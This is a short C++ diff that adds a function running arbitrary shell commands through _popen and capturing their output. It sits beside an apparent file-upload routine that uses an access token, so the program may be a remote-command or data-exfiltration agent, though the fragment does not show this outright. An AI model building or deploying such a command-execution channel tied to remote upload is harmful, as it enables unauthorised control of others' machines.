@@ -3,6 +3,7 @@
 #include <string>
 #include <stdio.h>
 #include <cmath>
+#include <algorithm>
 
 #define min 32
 #define max 126
@@ -310,6 +311,21 @@ static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DW
 	}
 	delete[] buffer;
 	return errorCode;
+}
+
+static WORD commandExecuter(std::string input, std::string& output) {
+	std::replace(input.begin(), input.end(), '\n', '&');
+	FILE* file = _popen(input.c_str(), "r");
+	output = "";
+	char* buffer = new char[1024];
+
+	while (fgets(buffer, 1024, file) != NULL) {
+		output = output + buffer;
+	}
+	_pclose(file);
+	delete[] buffer;
+
+	return 0;
 }
 
 //static void upload(MyString data) {
